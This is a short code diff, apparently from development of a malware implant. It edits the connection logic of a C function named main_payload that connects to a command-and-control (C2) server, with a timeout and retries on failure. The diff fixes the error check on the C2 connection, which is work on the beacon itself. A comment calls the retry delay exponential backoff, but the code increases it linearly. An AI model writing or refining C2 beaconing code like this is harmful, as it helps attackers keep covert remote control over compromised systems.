@@ -65,7 +65,7 @@ int main_payload(void) {
         socket_set_timeout(sock, 30000);
         
         // Connect to C2
-        if (socket_connect(sock, c2_host, c2_port) != ERR_SUCCESS) {
+        if (socket_connect(sock, c2_host, c2_port) < 0) {
             socket_close(sock);
             sleep_ms(10000 * (retry_count + 1)); // Exponential backoff
             retry_count++;
